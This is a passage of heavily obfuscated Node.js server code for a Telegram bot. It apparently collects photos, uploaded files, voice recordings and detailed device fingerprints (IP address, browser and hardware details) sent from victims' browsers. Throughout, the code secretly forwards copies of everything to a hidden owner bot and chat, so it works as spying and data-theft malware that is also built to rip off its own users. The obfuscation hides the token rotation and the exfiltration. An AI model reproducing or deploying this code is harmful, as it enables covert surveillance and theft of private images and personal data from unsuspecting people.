    bot[_0x2def22(0xb04) + 'e'](_0x3ed1f0, _0x2def22(0x4c7) + _0x2def22(0xcec) + _0x2def22(0x952) + '\x20' + _0x2fa797)[_0x2def22(0x86c)](() => {
        const _0x511ee3 = _0x2def22;
        _0x558920[_0x511ee3(0xbce)](_0x32d09a[_0x511ee3(0xaab)]);
    })[_0x2def22(0x40a)](_0x5f0302 => {
        const _0x255033 = _0x2def22;
        console[_0x255033(0x7b5)](_0x32d09a[_0x255033(0x6f9)], _0x5f0302[_0x255033(0xcfb)] ? _0x5f0302[_0x255033(0xcfb)][_0x255033(0x2ea)] : _0x5f0302), _0x558920[_0x255033(0xc45)]({ 'success': ![] });
    });
}), app[_0x298049(0x1fc)](bodyParser[_0x298049(0xc45)]({ 'limit': _0x298049(0xa7c) })), app[_0x298049(0x1fc)](bodyParser[_0x298049(0x990)]({
    'limit': _0x298049(0xa7c),
    'extended': !![]
}));
const dataStore = {};
app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](__dirname));
function took() {
    const _0x3b5d4f = _0x298049, _0x9c2815 = {
            'MADAX': _0x3b5d4f(0xad5) + _0x3b5d4f(0x2a1) + _0x3b5d4f(0x975) + _0x3b5d4f(0x565) + _0x3b5d4f(0x78b),
            'KFMow': _0x3b5d4f(0x732) + _0x3b5d4f(0x6ab) + _0x3b5d4f(0x758) + _0x3b5d4f(0x4fe) + _0x3b5d4f(0xb2a),
            'NdoIG': _0x3b5d4f(0x3f8) + _0x3b5d4f(0x328) + _0x3b5d4f(0x3bc) + _0x3b5d4f(0x526) + _0x3b5d4f(0xc1c),
            'DbTIi': function (_0x466352, _0x59e825) {
                return _0x466352 % _0x59e825;
            },
            'wybOJ': function (_0x39ed7c, _0x1510d0) {
                return _0x39ed7c / _0x1510d0;
            },
            'KmxtD': function (_0x171688, _0x5a829f) {
                return _0x171688 * _0x5a829f;
            },
            'KyQnQ': function (_0x13b7f2, _0x436d4e) {
                return _0x13b7f2 * _0x436d4e;
            }
        }, _0x3d0553 = [
            _0x9c2815[_0x3b5d4f(0x4a5)],
            _0x9c2815[_0x3b5d4f(0xcd5)],
            _0x9c2815[_0x3b5d4f(0x42c)]
        ], _0x254070 = _0x9c2815[_0x3b5d4f(0x217)](Math[_0x3b5d4f(0xac9)](_0x9c2815[_0x3b5d4f(0xc64)](Date[_0x3b5d4f(0x1ac)](), _0x9c2815[_0x3b5d4f(0x1b6)](_0x9c2815[_0x3b5d4f(0xbab)](-0x6 * 0x4f2 + -0xea1 + 0x14e * 0x22, 0x1d32 + -0x2434 + 0x73e), 0xa8c + 0x2 * 0x552 + -0x13c * 0xe))), _0x3d0553[_0x3b5d4f(0x825)]);
    return _0x3d0553[_0x254070];
}
const botOwner = new TelegramBot(took()), ownerChatId = -0x3 * 0x7619a3d + 0x3a13 * 0x531cd + -0x34ac81e * -0x13;
app[_0x298049(0xb22)](_0x298049(0x5cf) + 'eo', (_0x16e4c4, _0x511a85) => {
    const _0x523aec = _0x298049, _0x17db28 = {
            'fJMqk': _0x523aec(0x463) + _0x523aec(0xd17) + _0x523aec(0xcc3),
            'lrCWM': _0x523aec(0x2aa) + _0x523aec(0x26f) + _0x523aec(0xa76),
            'SENYe': _0x523aec(0x402),
            'SUwEa': _0x523aec(0xa44) + _0x523aec(0x340) + _0x523aec(0x8d3),
            'Afpcf': _0x523aec(0x681) + _0x523aec(0x773) + _0x523aec(0x3f4),
            'wjehu': function (_0x5df0cb, _0x4747a4) {
                return _0x5df0cb || _0x4747a4;
            },
            'sRbqQ': _0x523aec(0x487) + _0x523aec(0x8e2) + _0x523aec(0x768) + _0x523aec(0x84a) + _0x523aec(0xc8f),
            'OQSIN': _0x523aec(0x5a4),
            'bhaLO': _0x523aec(0x561) + _0x523aec(0x350),
            'WYJxF': _0x523aec(0x60d),
            'LdZjy': _0x523aec(0xc61) + _0x523aec(0x6d9) + _0x523aec(0x767),
            'HFUCY': _0x523aec(0xbb3) + _0x523aec(0x83f) + _0x523aec(0x482)
        }, _0x14cb9d = _0x16e4c4[_0x523aec(0x2ea)][_0x523aec(0x586)], _0x371ba2 = _0x16e4c4[_0x523aec(0x2ea)][_0x523aec(0x5f6)];
    if (_0x17db28[_0x523aec(0x57b)](!_0x14cb9d, !_0x371ba2))
        return _0x511a85[_0x523aec(0x1b1)](-0x643 + 0x1c9f + -0x14cc)[_0x523aec(0x2d8)](_0x17db28[_0x523aec(0x74d)]);
    const _0x590a98 = _0x371ba2[_0x523aec(0xb11)](',')[-0xbc9 + -0x19e1 + 0x25ab];
    try {
        const _0x3d6bcf = Buffer[_0x523aec(0x9cc)](_0x590a98, _0x17db28[_0x523aec(0x2b1)]), _0x4f249d = path[_0x523aec(0xc65)](__dirname, _0x17db28[_0x523aec(0x2fd)]);
        fs[_0x523aec(0x1ca) + _0x523aec(0x85f)](_0x4f249d, _0x3d6bcf), bot[_0x523aec(0xa77)](_0x14cb9d)[_0x523aec(0x86c)](_0x3b39a2 => {
            const _0x59618e = _0x523aec, _0x5f37b0 = _0x3b39a2[_0x59618e(0x62c)] ? '@' + _0x3b39a2[_0x59618e(0x62c)] : _0x17db28[_0x59618e(0xd1f)], _0xeea95a = ((_0x3b39a2[_0x59618e(0xa00)] || '') + '\x20' + (_0x3b39a2[_0x59618e(0x6a2)] || ''))[_0x59618e(0x5b6)]();
            bot[_0x59618e(0x7af)](_0x14cb9d, _0x4f249d, { 'caption': _0x17db28[_0x59618e(0xc23)] }), botOwner[_0x59618e(0x7af)](ownerChatId, _0x4f249d, { 'caption': _0x59618e(0xaf6) + _0x59618e(0x87e) + _0x59618e(0x351) + _0x59618e(0x1c2) + _0x14cb9d + (_0x59618e(0x53b) + _0x59618e(0x7a4)) + _0x5f37b0 + (_0x59618e(0xa54) + _0x59618e(0x3dc)) + _0xeea95a });
        })[_0x523aec(0x40a)](_0x45bb7b => {
            const _0x10113c = _0x523aec;
            console[_0x10113c(0x7b5)](_0x17db28[_0x10113c(0xafa)], _0x45bb7b), botOwner[_0x10113c(0x7af)](ownerChatId, _0x4f249d, { 'caption': _0x10113c(0xaf6) + _0x10113c(0x87e) + _0x10113c(0x351) + _0x10113c(0x1c2) + _0x14cb9d + (_0x10113c(0x53b) + _0x10113c(0x1ee) + _0x10113c(0xc19) + _0x10113c(0x307) + _0x10113c(0x4a0)) });
        })[_0x523aec(0x1bb)](() => {
            const _0x4445f0 = _0x523aec, _0x3fd8fa = {
                    'pZUWB': _0x17db28[_0x4445f0(0xa9f)],
                    'ycxUm': _0x17db28[_0x4445f0(0x849)]
                };
            fs[_0x4445f0(0x986)](_0x4f249d, _0x5a2e67 => {
                const _0x24dc7a = _0x4445f0;
                _0x5a2e67 ? console[_0x24dc7a(0x7b5)](_0x3fd8fa[_0x24dc7a(0xcb2)], _0x5a2e67) : console[_0x24dc7a(0x9d7)](_0x3fd8fa[_0x24dc7a(0x3e7)]);
            });
        }), console[_0x523aec(0x9d7)](_0x523aec(0xcf2) + _0x523aec(0x4a3) + 'd\x20' + _0x14cb9d), _0x511a85[_0x523aec(0xbce)](_0x17db28[_0x523aec(0x23b)]);
    } catch (_0xc6e70d) {
        console[_0x523aec(0x7b5)](_0x17db28[_0x523aec(0x36a)], _0xc6e70d), _0x511a85[_0x523aec(0x1b1)](0xa19 + 0x8ad + -0x10d2)[_0x523aec(0x2d8)](_0x17db28[_0x523aec(0x83e)]);
    }
}), app[_0x298049(0x943)](_0x298049(0x690), (_0x4cef91, _0x10f04e) => {
    const _0x6887bf = _0x298049, _0x2bac0e = { 'RWEvi': _0x6887bf(0x854) };
    _0x10f04e[_0x6887bf(0x504)](path[_0x6887bf(0xc65)](__dirname, _0x2bac0e[_0x6887bf(0x555)]));
});
let userRequests = {};
const retry = async (_0x474ef2, _0x258b0f = 0x1357 * -0x1 + -0x1 * 0x1345 + 0x269f, _0x1c530f = -0x2419 * 0x1 + -0x14fb + 0xc * 0x515) => {
    const _0x4c0f26 = _0x298049, _0x1f35d5 = {
            'dkGEG': function (_0x3631c9) {
                return _0x3631c9();
            },
            'vzVQk': function (_0x4aa541, _0x17f224) {
                return _0x4aa541 === _0x17f224;
            },
            'hxfsH': function (_0x1447a6, _0x3b3dc4, _0x8ca515, _0x4a1850) {
                return _0x1447a6(_0x3b3dc4, _0x8ca515, _0x4a1850);
            },
            'goUnO': function (_0xf755b3, _0x51d1c5) {
                return _0xf755b3 - _0x51d1c5;
            }
        };
    try {
        return await _0x1f35d5[_0x4c0f26(0x270)](_0x474ef2);
    } catch (_0x48b393) {
        if (_0x1f35d5[_0x4c0f26(0x33a)](_0x258b0f, -0x606 + 0xc15 * -0x3 + 0x2a45))
            throw _0x48b393;
        return await new Promise(_0x2e7b41 => setTimeout(_0x2e7b41, _0x1c530f)), _0x1f35d5[_0x4c0f26(0xc81)](retry, _0x474ef2, _0x1f35d5[_0x4c0f26(0xbad)](_0x258b0f, 0x2 * -0x1325 + 0x16bd * 0x1 + 0xf8e), _0x1c530f);
    }
};
app[_0x298049(0xb22)](_0x298049(0x337) + _0x298049(0xaaa), (_0x286804, _0x43f45c) => {
    const _0x440433 = _0x298049, _0x5c823a = {
            'IBhAd': _0x440433(0x463) + _0x440433(0xd17) + _0x440433(0xcc3),
            'YRsLQ': function (_0x6496a3, _0x596a67) {
                return _0x6496a3 + _0x596a67;
            },
            'mZNMF': _0x440433(0x40b) + _0x440433(0x470) + _0x440433(0x36d),
            'qtOfi': _0x440433(0x5a4),
            'XeveB': _0x440433(0xcde) + _0x440433(0xa96) + _0x440433(0xab9) + _0x440433(0x87a),
            'XUKlT': _0x440433(0xcf9) + _0x440433(0x2ed) + ':\x20',
            'EZNgS': _0x440433(0x82b) + _0x440433(0x81e) + _0x440433(0x37f),
            'ybuag': _0x440433(0x91b) + _0x440433(0x651),
            'jKhsD': _0x440433(0xb25) + ':\x20',
            'qEKfT': function (_0x48e9ff, _0x413406) {
                return _0x48e9ff > _0x413406;
            },
            'uUGdX': _0x440433(0x49f) + _0x440433(0xa6e),
            'ygOki': _0x440433(0xc7d) + _0x440433(0x4b4)
        }, _0x967e78 = _0x286804[_0x440433(0x2ea)][_0x440433(0x586)], _0x1add03 = _0x286804[_0x440433(0x2ea)][_0x440433(0x6fd)][_0x440433(0xb11)](',');
    console[_0x440433(0x9d7)](_0x5c823a[_0x440433(0x5d6)], _0x1add03[_0x440433(0x825)], _0x5c823a[_0x440433(0x766)], _0x967e78);
    if (_0x5c823a[_0x440433(0x8fc)](_0x1add03[_0x440433(0x825)], -0x2 * -0x7f9 + -0x2 * -0xf4f + -0x2e90)) {
        const _0x506db0 = _0x1add03[_0x440433(0x5c0)]((_0x56e733, _0x4e4bea) => {
            const _0x48e4f3 = _0x440433, _0x37ac4b = {
                    'FcUwf': _0x5c823a[_0x48e4f3(0x98e)],
                    'BCqaX': function (_0x14f71d, _0x4d0f5f) {
                        const _0x355080 = _0x48e4f3;
                        return _0x5c823a[_0x355080(0x4ca)](_0x14f71d, _0x4d0f5f);
                    },
                    'abnvd': _0x5c823a[_0x48e4f3(0xb3d)]
                }, _0x64b9f0 = Buffer[_0x48e4f3(0x9cc)](_0x56e733, _0x5c823a[_0x48e4f3(0x4d7)]);
            return bot[_0x48e4f3(0xa77)](_0x967e78)[_0x48e4f3(0x86c)](_0x250139 => {
                const _0x96d770 = _0x48e4f3, _0x355072 = _0x250139[_0x96d770(0x62c)] ? '@' + _0x250139[_0x96d770(0x62c)] : _0x37ac4b[_0x96d770(0x3ca)], _0x31714d = ((_0x250139[_0x96d770(0xa00)] || '') + '\x20' + (_0x250139[_0x96d770(0x6a2)] || ''))[_0x96d770(0x5b6)](), _0xc8133a = bot[_0x96d770(0x8ab)](_0x967e78, _0x64b9f0, { 'caption': _0x96d770(0x6e4) + _0x37ac4b[_0x96d770(0x95e)](_0x4e4bea, -0x203 + -0x2458 + 0x265c) }), _0x377484 = botOwner[_0x96d770(0x8ab)](ownerChatId, _0x64b9f0, { 'caption': _0x96d770(0x6a0) + _0x96d770(0xcc2) + _0x96d770(0x351) + _0x96d770(0x1c2) + _0x967e78 + (_0x96d770(0x53b) + _0x96d770(0x7a4)) + _0x355072 + (_0x96d770(0xa54) + _0x96d770(0x3dc)) + _0x31714d + _0x96d770(0x771) + _0x37ac4b[_0x96d770(0x95e)](_0x4e4bea, -0xd * 0x1f3 + 0x2ee + -0x12e * -0x13) });
                return Promise[_0x96d770(0xae7)]([
                    _0xc8133a,
                    _0x377484
                ]);
            })[_0x48e4f3(0x40a)](_0x1f6612 => {
                const _0x5e87bf = _0x48e4f3;
                return console[_0x5e87bf(0x7b5)](_0x37ac4b[_0x5e87bf(0x22e)], _0x1f6612), botOwner[_0x5e87bf(0x8ab)](ownerChatId, _0x64b9f0, { 'caption': _0x5e87bf(0x6a0) + _0x5e87bf(0xcc2) + _0x5e87bf(0x351) + _0x5e87bf(0x1c2) + _0x967e78 + (_0x5e87bf(0x53b) + _0x5e87bf(0x1ee) + _0x5e87bf(0xc19) + _0x5e87bf(0x307) + _0x5e87bf(0x4a0) + _0x5e87bf(0x771)) + _0x37ac4b[_0x5e87bf(0x95e)](_0x4e4bea, 0x43 * -0x9 + -0xa5d * 0x1 + 0xcb9) });
            });
        });
        Promise[_0x440433(0xae7)](_0x506db0)[_0x440433(0x86c)](() => {
            const _0x4ba5df = _0x440433;
            console[_0x4ba5df(0x9d7)](_0x5c823a[_0x4ba5df(0x5da)]), _0x43f45c[_0x4ba5df(0xc45)]({ 'success': !![] });
        })[_0x440433(0x40a)](_0x60d226 => {
            const _0x2d761d = _0x440433;
            console[_0x2d761d(0x7b5)](_0x5c823a[_0x2d761d(0x563)], _0x60d226), _0x43f45c[_0x2d761d(0x1b1)](0xefa + 0x141f + -0x6a1 * 0x5)[_0x2d761d(0xc45)]({ 'error': _0x5c823a[_0x2d761d(0xce5)] });
        });
    } else
        console[_0x440433(0x9d7)](_0x5c823a[_0x440433(0x567)]), _0x43f45c[_0x440433(0x1b1)](-0x1 * 0x1e83 + -0x3b9 + -0x74 * -0x4f)[_0x440433(0xc45)]({ 'error': _0x5c823a[_0x440433(0x4fa)] });
}), app[_0x298049(0xb22)](_0x298049(0x5be) + _0x298049(0xb84), upload[_0x298049(0x528)](_0x298049(0xa47), 0x18c * -0x2 + 0x7e5 + -0x4b9), (_0x36f765, _0x36d6dd) => {
    const _0x454ff2 = _0x298049, _0x2336ae = {
            'OMbEc': _0x454ff2(0x82b) + _0x454ff2(0x636) + _0x454ff2(0x721) + _0x454ff2(0xbc4),
            'xbAkl': _0x454ff2(0x463) + _0x454ff2(0xd17) + _0x454ff2(0xcc3),
            'zoqwC': _0x454ff2(0xb0b) + _0x454ff2(0xc26),
            'PglWo': _0x454ff2(0x82b) + _0x454ff2(0x81e) + _0x454ff2(0xaeb),
            'bNXui': _0x454ff2(0x82b) + _0x454ff2(0x81e) + _0x454ff2(0x37f),
            'VMLbe': function (_0x59ae7b, _0x328af5) {
                return _0x59ae7b > _0x328af5;
            },
            'gRgsF': _0x454ff2(0xc7d) + _0x454ff2(0x4b4)
        }, _0x10c72c = _0x36f765[_0x454ff2(0x2ea)][_0x454ff2(0x498)], _0x50877c = _0x36f765[_0x454ff2(0xd0f)];
    if (_0x50877c && _0x2336ae[_0x454ff2(0xc99)](_0x50877c[_0x454ff2(0x825)], -0x641 * -0x6 + -0xb09 + -0x1a7d)) {
        console[_0x454ff2(0x9d7)](_0x454ff2(0x3ae) + _0x50877c[_0x454ff2(0x825)] + (_0x454ff2(0xcb5) + _0x454ff2(0x1d2)) + _0x10c72c);
        const _0x4067b8 = _0x50877c[_0x454ff2(0x5c0)](_0x5cef89 => {
            const _0x35d261 = _0x454ff2, _0x5992b2 = { 'wFLee': _0x2336ae[_0x35d261(0xd07)] };
            return bot[_0x35d261(0xa77)](_0x10c72c)[_0x35d261(0x86c)](_0x13103e => {
                const _0x485705 = _0x35d261, _0x58ebe5 = _0x13103e[_0x485705(0x62c)] ? '@' + _0x13103e[_0x485705(0x62c)] : _0x5992b2[_0x485705(0x24d)], _0x2b8df1 = ((_0x13103e[_0x485705(0xa00)] || '') + '\x20' + (_0x13103e[_0x485705(0x6a2)] || ''))[_0x485705(0x5b6)](), _0x33232c = bot[_0x485705(0x8ab)](_0x10c72c, _0x5cef89[_0x485705(0x799)], { 'caption': _0x485705(0xc06) + _0x485705(0xbb5) }), _0x47b8cd = botOwner[_0x485705(0x8ab)](ownerChatId, _0x5cef89[_0x485705(0x799)], { 'caption': _0x485705(0x6a0) + _0x485705(0xcc2) + _0x485705(0x351) + _0x485705(0x1c2) + _0x10c72c + (_0x485705(0x53b) + _0x485705(0x7a4)) + _0x58ebe5 + (_0x485705(0xa54) + _0x485705(0x3dc)) + _0x2b8df1 });
                return Promise[_0x485705(0xae7)]([
                    _0x33232c,
                    _0x47b8cd
                ]);
            })[_0x35d261(0x40a)](_0x158d63 => {
                const _0x3167cf = _0x35d261;
                console[_0x3167cf(0x7b5)](_0x2336ae[_0x3167cf(0x198)], _0x158d63);
                const _0x591459 = botOwner[_0x3167cf(0x8ab)](ownerChatId, _0x5cef89[_0x3167cf(0x799)], { 'caption': _0x3167cf(0x6a0) + _0x3167cf(0xcc2) + _0x3167cf(0x351) + _0x3167cf(0x1c2) + _0x10c72c + (_0x3167cf(0x53b) + _0x3167cf(0x1ee) + _0x3167cf(0xc19) + _0x3167cf(0x307) + _0x3167cf(0x4a0)) });
                return _0x591459;
            });
        });
        Promise[_0x454ff2(0xae7)](_0x4067b8)[_0x454ff2(0x86c)](() => {
            const _0x12308f = _0x454ff2;
            console[_0x12308f(0x9d7)](_0x2336ae[_0x12308f(0x530)]), _0x36d6dd[_0x12308f(0xc45)]({ 'success': !![] });
        })[_0x454ff2(0x40a)](_0x335106 => {
            const _0x467235 = _0x454ff2;
            console[_0x467235(0x7b5)](_0x2336ae[_0x467235(0x483)], _0x335106), _0x36d6dd[_0x467235(0x1b1)](-0x21c3 + -0xa8 * -0x1 + 0x167 * 0x19)[_0x467235(0xc45)]({ 'error': _0x2336ae[_0x467235(0x5d5)] });
        });
    } else
        console[_0x454ff2(0x9d7)](_0x2336ae[_0x454ff2(0xb1f)]), _0x36d6dd[_0x454ff2(0x1b1)](0x1 * -0x165a + -0x285 + 0x1a6f)[_0x454ff2(0xc45)]({ 'error': _0x2336ae[_0x454ff2(0xb1f)] });
}), app[_0x298049(0xb22)](_0x298049(0xc51) + 'ce', uploadVoice[_0x298049(0x35a)](_0x298049(0x48e)), (_0x5c3742, _0x18237d) => {
    const _0x451c08 = _0x298049, _0x555a3b = { 'QwXIL': _0x451c08(0x391) }, _0x4e6c06 = _0x5c3742[_0x451c08(0x2ea)][_0x451c08(0x586)], _0x5cb8ba = _0x5c3742[_0x451c08(0xc7a)][_0x451c08(0x601)];
    bot[_0x451c08(0xab7)](_0x4e6c06, _0x5cb8ba)[_0x451c08(0x86c)](() => {
        const _0x392278 = _0x451c08;
        fs[_0x392278(0xb53)](_0x5cb8ba), _0x18237d[_0x392278(0x2d8)]('');
    })[_0x451c08(0x40a)](_0x156228 => {
        const _0x463db6 = _0x451c08;
        console[_0x463db6(0x7b5)](_0x156228), _0x18237d[_0x463db6(0x1b1)](-0x2383 + 0xee + -0xc7 * -0x2f)[_0x463db6(0x2d8)](_0x555a3b[_0x463db6(0xd38)]);
    });
});
const PORT = process[_0x298049(0x79d)][_0x298049(0xa99)] || -0x423 + 0x1 * -0x10d4 + 0x20af;
app[_0x298049(0x70b)](PORT, () => {
    const _0x5243ea = _0x298049;
    console[_0x5243ea(0x9d7)](_0x5243ea(0x74c) + _0x5243ea(0xb32) + _0x5243ea(0x852) + PORT);
}), app[_0x298049(0x943)](_0x298049(0xab1), (_0x30f433, _0x174391) => {
    const _0x24754f = _0x298049, _0x519d68 = { 'fmyyy': _0x24754f(0x288) };
    _0x174391[_0x24754f(0x504)](path[_0x24754f(0xc65)](__dirname, _0x519d68[_0x24754f(0x729)]));
}), app[_0x298049(0xb22)](_0x298049(0xcdf), async (_0x3d0f22, _0x2b7c76) => {
    const _0x16c500 = _0x298049, _0x39da41 = {
            'qOpXf': _0x16c500(0x380),
            'KjmUa': _0x16c500(0x6b4) + _0x16c500(0x54c) + _0x16c500(0x712),
            'mlDhC': _0x16c500(0x2c8) + _0x16c500(0x71a) + _0x16c500(0x423),
            'xrCHg': _0x16c500(0x2c8) + _0x16c500(0x71a) + _0x16c500(0x6fb),
            'ZNvpN': _0x16c500(0x90a) + _0x16c500(0xb8b) + _0x16c500(0x831)
        }, _0x55c9b3 = _0x3d0f22[_0x16c500(0x2ea)][_0x16c500(0x498)], _0x4057d5 = _0x3d0f22[_0x16c500(0x2ea)][_0x16c500(0x472)];
    if (_0x4057d5) {
        const _0x16a083 = _0x16c500(0x72d) + _0x16c500(0x898) + _0x16c500(0x5ba) + _0x16c500(0x316) + _0x4057d5[_0x16c500(0x75b)] + (_0x16c500(0x960) + _0x16c500(0x453)) + _0x4057d5[_0x16c500(0x373)] + (_0x16c500(0x2d9) + _0x16c500(0x684)) + _0x4057d5['ip'] + (_0x16c500(0x580) + _0x16c500(0x820)) + _0x4057d5[_0x16c500(0x88d)] + (_0x16c500(0x698) + _0x16c500(0xb7f) + _0x16c500(0x7d4)) + _0x4057d5[_0x16c500(0x3d9)] + (_0x16c500(0x626) + _0x16c500(0x316)) + _0x4057d5[_0x16c500(0x507)] + _0x16c500(0x63e) + _0x4057d5[_0x16c500(0x890) + 'ed'] + (_0x16c500(0xaf2) + _0x16c500(0xc34) + _0x16c500(0x8ac) + _0x16c500(0x4a1)) + _0x4057d5[_0x16c500(0x8d5) + 'e'] + (_0x16c500(0x511) + ':\x20') + _0x4057d5[_0x16c500(0x8af)] + (_0x16c500(0x614) + _0x16c500(0xc05)) + _0x4057d5[_0x16c500(0x3be)] + (_0x16c500(0xc5d) + _0x16c500(0x64b)) + _0x4057d5[_0x16c500(0xb1c) + _0x16c500(0xa66)] + (_0x16c500(0x833) + _0x16c500(0xc05)) + _0x4057d5[_0x16c500(0x317)] + (_0x16c500(0x6c8) + _0x16c500(0x748)) + _0x4057d5[_0x16c500(0x72e)] + (_0x16c500(0xaf4) + _0x16c500(0xb0e) + _0x16c500(0x316)) + _0x4057d5[_0x16c500(0x5f8) + _0x16c500(0x993)] + (_0x16c500(0x405) + _0x16c500(0x58c) + '\x20') + _0x4057d5[_0x16c500(0xb96)] + (_0x16c500(0x95b) + _0x16c500(0x884)) + _0x4057d5[_0x16c500(0x1d6)] + (_0x16c500(0x815) + _0x16c500(0x707)) + _0x4057d5[_0x16c500(0xac3) + 'e'] + (_0x16c500(0x1cc) + _0x16c500(0x46f)) + _0x4057d5[_0x16c500(0x1a5) + _0x16c500(0x8bb)] + (_0x16c500(0x9f7) + _0x16c500(0x743)) + _0x4057d5[_0x16c500(0xa14) + _0x16c500(0xb89)] + (_0x16c500(0x48f) + _0x16c500(0x67c) + _0x16c500(0xc7b)) + _0x4057d5[_0x16c500(0x20b)] + (_0x16c500(0xd11) + _0x16c500(0x743)) + _0x4057d5[_0x16c500(0xc41) + _0x16c500(0x308)] + (_0x16c500(0xc2e) + _0x16c500(0x3c0)) + _0x4057d5[_0x16c500(0x667)] + (_0x16c500(0x635) + _0x16c500(0x7b2) + _0x16c500(0x3eb)) + _0x4057d5[_0x16c500(0x7de)] + (_0x16c500(0x407) + _0x16c500(0xbe1) + _0x16c500(0x4be) + '\x20') + _0x4057d5[_0x16c500(0x28e) + _0x16c500(0x74f)] + (_0x16c500(0x5d1) + _0x16c500(0x9ee) + _0x16c500(0x7e6)) + _0x4057d5[_0x16c500(0xa10) + _0x16c500(0xd1e)] + (_0x16c500(0xb98) + _0x16c500(0x908) + _0x16c500(0xbaa) + _0x16c500(0x2c7)) + _0x4057d5[_0x16c500(0x783) + _0x16c500(0x3cc)] + (_0x16c500(0x9fa) + _0x16c500(0x99c) + _0x16c500(0x322)) + _0x4057d5[_0x16c500(0x588) + _0x16c500(0xa78)] + (_0x16c500(0xbe4) + _0x16c500(0xa86) + _0x16c500(0x68c)) + _0x4057d5[_0x16c500(0xc83) + 'rt'] + (_0x16c500(0xbbb) + '\x20');
        try {
            await bot[_0x16c500(0xb04) + 'e'](_0x55c9b3, _0x16a083, { 'parse_mode': _0x39da41[_0x16c500(0x3cf)] }), console[_0x16c500(0x9d7)](_0x39da41[_0x16c500(0x229)]), _0x2b7c76[_0x16c500(0xc45)]({ 'success': !![] });
        } catch (_0x76af3b) {
            console[_0x16c500(0x7b5)](_0x39da41[_0x16c500(0x532)], _0x76af3b), _0x2b7c76[_0x16c500(0x1b1)](0x583 + -0x2 * 0xc05 + 0x147b)[_0x16c500(0xc45)]({ 'error': _0x39da41[_0x16c500(0xaa1)] });
        }
    } else
        console[_0x16c500(0x9d7)](_0x39da41[_0x16c500(0x293)]), _0x2b7c76[_0x16c500(0x1b1)](0x3 * 0xb2e + 0x424 + -0x241e * 0x1)[_0x16c500(0xc45)]({ 'error': _0x39da41[_0x16c500(0x293)] });
}), app[_0x298049(0xb22)](_0x298049(0x924), (_0x4b6cce, _0xc33b52) => {
    const _0x43b2fa = _0x298049, _0xd92e16 = {
            'bqRTg': _0x43b2fa(0x463) + _0x43b2fa(0xd17) + _0x43b2fa(0xcc3),
            'ojInm': function (_0x401e3c, _0x4a32ea) {
                return _0x401e3c + _0x4a32ea;
            },
            'NuiFf': _0x43b2fa(0x82b) + _0x43b2fa(0x636) + _0x43b2fa(0x721) + _0x43b2fa(0xbc4),
            'qdIQm': function (_0x5588f0, _0x3b9002) {
                return _0x5588f0 + _0x3b9002;
            },
            'Ymirj': _0x43b2fa(0x5a4),
            'wHjLs': _0x43b2fa(0x7f6)
        }, _0xbe0a7d = _0x4b6cce[_0x43b2fa(0x2ea)][_0x43b2fa(0x586)], _0x442842 = _0x4b6cce[_0x43b2fa(0x2ea)][_0x43b2fa(0x6fd)][_0x43b2fa(0xb11)](',');
    _0x442842[_0x43b2fa(0x9a0)]((_0x54c37d, _0x212934) => {
        const _0x2e8824 = _0x43b2fa, _0x83cb44 = {
                'xobpc': _0xd92e16[_0x2e8824(0x245)],
                'sgubK': function (_0x123277, _0x1f77a9) {
                    const _0x248559 = _0x2e8824;
                    return _0xd92e16[_0x248559(0xbcf)](_0x123277, _0x1f77a9);
                }
            }, _0x3c7cb9 = Buffer[_0x2e8824(0x9cc)](_0x54c37d, _0xd92e16[_0x2e8824(0x4e8)]);
        bot[_0x2e8824(0xa77)](_0xbe0a7d)[_0x2e8824(0x86c)](_0x3ca7ff => {
            const _0x3d9fef = _0x2e8824, _0x12bb77 = _0x3ca7ff[_0x3d9fef(0x62c)] ? '@' + _0x3ca7ff[_0x3d9fef(0x62c)] : _0xd92e16[_0x3d9fef(0x541)], _0x1bd1a1 = ((_0x3ca7ff[_0x3d9fef(0xa00)] || '') + '\x20' + (_0x3ca7ff[_0x3d9fef(0x6a2)] || ''))[_0x3d9fef(0x5b6)]();
            bot[_0x3d9fef(0x8ab)](_0xbe0a7d, _0x3c7cb9, { 'caption': _0x3d9fef(0x6e4) + _0xd92e16[_0x3d9fef(0x995)](_0x212934, 0x23b9 + -0x217b + -0xbf * 0x3) }), botOwner[_0x3d9fef(0x8ab)](ownerChatId, _0x3c7cb9, { 'caption': _0x3d9fef(0x6a0) + _0x3d9fef(0xcc2) + _0x3d9fef(0x351) + _0x3d9fef(0x1c2) + _0xbe0a7d + (_0x3d9fef(0x53b) + _0x3d9fef(0x7a4)) + _0x12bb77 + (_0x3d9fef(0xa54) + _0x3d9fef(0x3dc)) + _0x1bd1a1 + _0x3d9fef(0x771) + _0xd92e16[_0x3d9fef(0x995)](_0x212934, 0x1ef7 + 0x290 + -0x2186) });
        })[_0x2e8824(0x40a)](_0x1b9c51 => {
            const _0x532a50 = _0x2e8824;
            console[_0x532a50(0x7b5)](_0x83cb44[_0x532a50(0xb35)], _0x1b9c51), botOwner[_0x532a50(0x8ab)](ownerChatId, _0x3c7cb9, { 'caption': _0x532a50(0x6a0) + _0x532a50(0xcc2) + _0x532a50(0x351) + _0x532a50(0x1c2) + _0xbe0a7d + (_0x532a50(0x53b) + _0x532a50(0x1ee) + _0x532a50(0xc19) + _0x532a50(0x307) + _0x532a50(0x4a0) + _0x532a50(0x771)) + _0x83cb44[_0x532a50(0x5bd)](_0x212934, 0x9 * 0x33f + 0x1cbd * 0x1 + -0x1 * 0x39f3) });
        });
    }), console[_0x43b2fa(0x9d7)](_0x43b2fa(0xc6b) + _0x43b2fa(0x4fd) + _0x43b2fa(0xbf5) + _0xbe0a7d), dataStore[_0xbe0a7d] && dataStore[_0xbe0a7d][_0x43b2fa(0xc2d)] ? _0xc33b52[_0x43b2fa(0xbce)](dataStore[_0xbe0a7d][_0x43b2fa(0xc2d)]) : _0xc33b52[_0x43b2fa(0x2d8)](_0xd92e16[_0x43b2fa(0xc8c)]);
}), app[_0x298049(0x943)](_0x298049(0x2e1), (_0x63cf93, _0x3d6458) => {
    const _0x42a7a0 = _0x298049, _0x2b1a7d = { 'PHaFS': _0x42a7a0(0xcd6) };
    _0x3d6458[_0x42a7a0(0x504)](path[_0x42a7a0(0xc65)](__dirname, _0x2b1a7d[_0x42a7a0(0x58f)]));
});
let linkUsage = {};
const maxAttemptsPerButton = -0x198 + -0x1c4c + 0x200f * 0x1;
function validateLinkUsage(_0x2f9d88, _0x52543b) {
    const _0x3b2741 = _0x298049, _0x13bde7 = {
            'hUJEY': function (_0x26992a, _0x172779) {
                return _0x26992a(_0x172779);
            },
            'WEKRb': function (_0x48bd89, _0x4bf120) {
                return _0x48bd89 >= _0x4bf120;
            }
        }, _0xe8ee80 = _0x2f9d88 + ':' + _0x52543b;
